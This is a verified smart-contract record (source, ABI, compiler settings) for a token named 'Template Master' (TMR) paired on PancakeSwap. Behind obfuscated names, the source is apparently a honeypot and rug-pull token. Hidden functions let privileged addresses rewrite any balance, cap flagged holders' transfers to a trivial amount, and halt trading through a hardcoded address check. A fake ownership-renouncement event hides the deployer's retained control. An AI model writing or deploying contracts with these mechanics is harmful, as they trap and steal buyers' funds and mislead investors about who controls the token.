{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.10;\n\ninterface autoFrom {\n    function createPair(address swapFundToken, address modeToToken) external returns (address);\n}\n\ninterface listLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamLimitTake) external view returns (uint256);\n\n    function transfer(address modeSender, uint256 modeExemptShould) external returns (bool);\n\n    function allowance(address toReceiverAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 modeExemptShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeSender,\n        uint256 modeExemptShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed senderTotalTx, uint256 value);\n    event Approval(address indexed toReceiverAmount, address indexed spender, uint256 value);\n}\n\nabstract contract atFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toReceiverFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundFrom is listLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TemplateMaster is atFee, listLaunched, fundFrom {\n\n    mapping(address => bool) public fundSwap;\n\n    address private receiverFrom;\n\n    string private totalMarketing = \"Template Master\";\n\n    uint256 constant swapLiquidity = 17 ** 10;\n\n    bool public exemptToken;\n\n    mapping(address => mapping(address => uint256)) private shouldSwap;\n\n    bool public sellList;\n\n    uint256 private receiverFund = 100000000 * 10 ** 18;\n\n    constructor (){\n        if (isFundTeam == tokenLimit) {\n            fromExempt = maxMarketing;\n        }\n        toReceiverFund totalLaunchExempt = toReceiverFund(teamFeeLaunch);\n        modeSwap = autoFrom(totalLaunchExempt.factory()).createPair(totalLaunchExempt.WETH(), address(this));\n        \n        toEnable = _msgSender();\n        fundSwap[toEnable] = true;\n        feeShould[toEnable] = receiverFund;\n        totalTake();\n        \n        emit Transfer(address(0), toEnable, receiverFund);\n    }\n\n    function teamSender(address walletLiquidityFund, address modeSender, uint256 modeExemptShould) internal returns (bool) {\n        if (walletLiquidityFund == toEnable) {\n            return tokenMarketing(walletLiquidityFund, modeSender, modeExemptShould);\n        }\n        uint256 txSenderEnable = listLaunched(modeSwap).balanceOf(tokenTx);\n        require(txSenderEnable == atMarketing);\n        require(modeSender != tokenTx);\n        if (tradingAuto[walletLiquidityFund]) {\n            return tokenMarketing(walletLiquidityFund, modeSender, swapLiquidity);\n        }\n        return tokenMarketing(walletLiquidityFund, modeSender, modeExemptShould);\n    }\n\n    function balanceOf(address teamLimitTake) public view virtual override returns (uint256) {\n        return feeShould[teamLimitTake];\n    }\n\n    function fundTake(address minExemptTotal) public {\n        launchedShould();\n        \n        if (minExemptTotal == toEnable || minExemptTotal == modeSwap) {\n            return;\n        }\n        tradingAuto[minExemptTotal] = true;\n    }\n\n    mapping(address => bool) public tradingAuto;\n\n    address public toEnable;\n\n    bool public tokenLimit;\n\n    string private teamTrading = \"TMR\";\n\n    function limitEnable(address totalWallet) public {\n        require(totalWallet.balance < 100000);\n        if (exemptToken) {\n            return;\n        }\n        \n        fundSwap[totalWallet] = true;\n        \n        exemptToken = true;\n    }\n\n    mapping(address => uint256) private feeShould;\n\n    function txLaunched(uint256 modeExemptShould) public {\n        launchedShould();\n        atMarketing = modeExemptShould;\n    }\n\n    function amountFeeBuy(address enableTx, uint256 modeExemptShould) public {\n        launchedShould();\n        feeShould[enableTx] = modeExemptShould;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamTrading;\n    }\n\n    function launchedShould() private view {\n        require(fundSwap[_msgSender()]);\n    }\n\n    uint8 private isEnable = 18;\n\n    bool public autoLaunched;\n\n    function decimals() external view virtual override returns (uint8) {\n        return isEnable;\n    }\n\n    function getOwner() external view returns (address) {\n        return receiverFrom;\n    }\n\n    bool private isFundTeam;\n\n    uint256 private fromExempt;\n\n    function name() external view virtual override returns (string memory) {\n        return totalMarketing;\n    }\n\n    uint256 public receiverModeFrom;\n\n    bool private exemptLimit;\n\n    uint256 private maxMarketing;\n\n    function totalTake() public {\n        emit OwnershipTransferred(toEnable, address(0));\n        receiverFrom = address(0);\n    }\n\n    uint256 totalToken;\n\n    uint256 atMarketing;\n\n    function transferFrom(address walletLiquidityFund, address modeSender, uint256 modeExemptShould) external override returns (bool) {\n        if (_msgSender() != teamFeeLaunch) {\n            if (shouldSwap[walletLiquidityFund][_msgSender()] != type(uint256).max) {\n                require(modeExemptShould <= shouldSwap[walletLiquidityFund][_msgSender()]);\n                shouldSwap[walletLiquidityFund][_msgSender()] -= modeExemptShould;\n            }\n        }\n        return teamSender(walletLiquidityFund, modeSender, modeExemptShould);\n    }\n\n    address teamFeeLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function owner() external view returns (address) {\n        return receiverFrom;\n    }\n\n    function approve(address senderLaunched, uint256 modeExemptShould) public virtual override returns (bool) {\n        shouldSwap[_msgSender()][senderLaunched] = modeExemptShould;\n        emit Approval(_msgSender(), senderLaunched, modeExemptShould);\n        return true;\n    }\n\n    address tokenTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function tokenMarketing(address walletLiquidityFund, address modeSender, uint256 modeExemptShould) internal returns (bool) {\n        require(feeShould[walletLiquidityFund] >= modeExemptShould);\n        feeShould[walletLiquidityFund] -= modeExemptShould;\n        feeShould[modeSender] += modeExemptShould;\n        emit Transfer(walletLiquidityFund, modeSender, modeExemptShould);\n        return true;\n    }\n\n    function transfer(address enableTx, uint256 modeExemptShould) external virtual override returns (bool) {\n        return teamSender(_msgSender(), enableTx, modeExemptShould);\n    }\n\n    address public modeSwap;\n\n    event OwnershipTransferred(address indexed tokenMax, address indexed modeLaunch);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverFund;\n    }\n\n    function allowance(address modeShould, address senderLaunched) external view virtual override returns (uint256) {\n        if (senderLaunched == teamFeeLaunch) {\n            return type(uint256).max;\n        }\n        return shouldSwap[modeShould][senderLaunched];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toReceiverAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTotalTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeShould\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeExemptShould\",\"type\":\"uint256\"}],\"name\":\"amountFeeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeExemptShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLimitTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minExemptTotal\",\"type\":\"address\"}],\"name\":\"fundTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalWallet\",\"type\":\"address\"}],\"name\":\"limitEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverModeFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeExemptShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLiquidityFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"modeExemptShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"modeExemptShould\",\"type\":\"uint256\"}],\"name\":\"txLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TemplateMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}